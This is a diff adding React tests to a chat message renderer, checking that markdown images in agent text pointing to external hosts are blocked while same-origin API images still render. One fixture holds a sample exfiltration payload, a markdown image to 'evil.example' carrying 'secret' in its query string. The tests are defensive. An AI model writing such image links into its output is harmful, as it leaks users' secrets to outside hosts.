@@ -84,3 +84,18 @@ describe('withoutDuplicateToolImages', () => {
     expect(withoutDuplicateToolImages([result, dup, orphan, user]).map((m) => m.id)).toEqual([10, 12, 13]);
   });
 });
+
+describe('Markdown images', () => {
+  it('never loads an external image from agent text (exfiltration via URL)', () => {
+    const m = row(90, { role: 'assistant', kind: 'text', content: 'x ![leak](https://evil.example/p.png?d=secret) y' });
+    const { container } = render(<MessageItem message={m} />);
+    expect(container.querySelector('img')).toBeNull();
+    expect(screen.getByText(/\[image: leak\]/)).toBeTruthy();
+  });
+
+  it('renders same-origin API images', () => {
+    const m = row(91, { role: 'assistant', kind: 'text', content: `![v](/api/projects/${PID}/images/a.png)` });
+    const { container } = render(<MessageItem message={m} />);
+    expect(container.querySelector('img')?.getAttribute('src')).toBe(`/api/projects/${PID}/images/a.png`);
+  });
+});
